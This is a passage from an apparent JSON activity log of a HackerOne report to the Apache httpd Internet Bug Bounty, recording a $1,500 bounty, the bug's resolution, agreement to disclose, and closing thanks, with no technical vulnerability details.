33928a68a4255fb50a83180281a60da5"},"profile":{"name":"Apache httpd (IBB)"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-apache","collaborator":{"username":"real","url":"/real"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5774472,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for helping keep the Internet safer!","markdown_message":"\u003cp\u003eThank you for helping keep the Internet safer!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-10T20:32:47.325Z","updated_at":"2019-09-10T20:32:47.325Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"real","url":"/real"},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5774474,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-10T20:32:52.387Z","updated_at":"2019-09-10T20:32:52.387Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5778774,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-11T09:46:31.756Z","updated_at":"2019-09-11T09:46:31.756Z","actor":{"username":"real","cleared":false,"url":"/real","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5778775,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-11T09:46:31.831Z","updated_at":"2019-09-11T09:46:31.831Z","actor":{"username":"real","cleared":false,"url":"/real","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5778776,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you !","markdown_message":"\u003cp\u003eThank you !\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-11T09:46:38.990Z","updated_at":"2019-09-11T09:46:38.990Z","actor":{"username":"real","cleared":false,"url":"/real","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}